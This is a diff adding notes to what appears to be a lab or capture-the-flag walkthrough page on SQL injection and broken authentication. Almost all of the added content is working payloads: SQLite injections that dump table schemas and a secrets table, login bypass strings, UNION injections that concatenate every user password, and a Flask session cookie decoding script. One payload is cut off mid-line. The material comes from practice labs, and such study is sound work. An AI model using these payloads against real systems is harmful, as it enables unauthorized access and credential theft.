@@ -44,6 +44,155 @@ Upgrade-Insecure-Requests: 1
 profileID=-1%27%20or%201=1--%20-&password=a
 ```
 
+## Introduction to SQL Injection: Part 2
+
+
+
+
+
+
+
+Shows all the table names
+
+```
+',nickName=(SELECT group_concat(tbl_name) FROM sqlite_master WHERE type='table' and tbl_name NOT like 'sqlite_%'),email='
+```
+
+<figure><img src="../../.gitbook/assets/image (156).png" alt=""><figcaption></figcaption></figure>
+
+Show all fields from the table usertable
+
+```
+l FROM sqlite_master WHERE type!='meta' AND sql NOT NULL AND name ='usertable'),email='
+```
+
+<figure><img src="../../.gitbook/assets/image (154).png" alt=""><figcaption></figcaption></figure>
+
+Shows all the fields from the table secret
+
+```
+',nickName=(SELECT sql FROM sqlite_master WHERE type!='meta' AND sql NOT NULL AND name ='secrets'),email='
+```
+
+<figure><img src="../../.gitbook/assets/image (157).png" alt=""><figcaption></figcaption></figure>
+
+Display all the values from the table secrets
+
+```
+',nickName=(SELECT group_concat(id || "," || author|| "," || secret|| ":") from secrets),email='
+```
+
+<figure><img src="../../.gitbook/assets/image (158).png" alt=""><figcaption></figcaption></figure>
+
+## Vulnerable Startup: Broken Authentication
+
+```
+1' or '1'='1'-- -
+```
+
+<figure><img src="../../.gitbook/assets/image (159).png" alt=""><figcaption></figcaption></figure>
+
+## Vulnerable Startup: Broken Authentication&#x20;
+
+```
+Username: ' OR 1=1-- -
+```
+
+<figure><img src="../../.gitbook/assets/image (161).png" alt=""><figcaption></figcaption></figure>
+
+<figure><img src="../../.gitbook/assets/image (160).png" alt=""><figcaption></figcaption></figure>
+
+#### **decode\_cookie.py**
+
+```
+#!/usr/bin/python3
+import zlib
+import sys
+import json
+from itsdangerous import base64_decode
+
+
+def decode(cookie):
+    """
+    Decode a Flask cookie
+
+    https://www.kirsle.net/wizards/flask-session.cgi
+    """
+    try:
+        compressed = False
+        payload = cookie
+
+        if payload.startswith('.'):
+            compressed = True
+            payload = payload[1:]
+
+        data = payload.split(".")[0]
+
+        data = base64_decode(data)
+        if compressed:
+            data = zlib.decompress(data)
+
+        return data.decode("utf-8")
+    except Exception as e:
+        return f"[Decoding error: are you sure this was a Flask session cookie? {e}]"
+
+
+cookie = sys.argv[1]
+data = decode(cookie)
+json_data = json.loads(data)
+pretty = json.dumps(json_data, sort_keys=True, indent=4, separators=(",", ": "))
+print(pretty)
+
+```
+
+
+
+<figure><img src="../../.gitbook/assets/image (162).png" alt=""><figcaption></figcaption></figure>
+
+```
+python decode_cookie.py .eJyrVkrOSMzJSc1LTzWKLy1OLYrPTFGyMtRBF85LzE1VslJKTMnNzFOqBQAYpRNS.ZPCIPg.GEqyzNXd85i4M0Oqpt9ITOmwTOM
+```
+
+<figure><img src="../../.gitbook/assets/image (163).png" alt=""><figcaption></figcaption></figure>
+
+
+
+```
+' UNION SELECT 1,NULL-- -
+```
+
+<figure><img src="../../.gitbook/assets/image (164).png" alt=""><figcaption></figcaption></figure>
+
+```
+' UNION SELECT 1,2-- - 
+```
+
+<figure><img src="../../.gitbook/assets/image (165).png" alt=""><figcaption></figcaption></figure>
+
+Enmerutate passwords, the below only returns the first result which we probably don't want.
+
+```
+' UNION SELECT 1, password from users-- -
+```
+
+<figure><img src="../../.gitbook/assets/image (166).png" alt=""><figcaption></figcaption></figure>
+
+This way concats all the passwords
+
+```
+' UNION SELECT 1,group_concat(password) FROM users-- -
+```
+
+<figure><img src="../../.gitbook/assets/image (167).png" alt=""><figcaption></figcaption></figure>
+
+
+
+
+
+
+
+
+
 
 
 
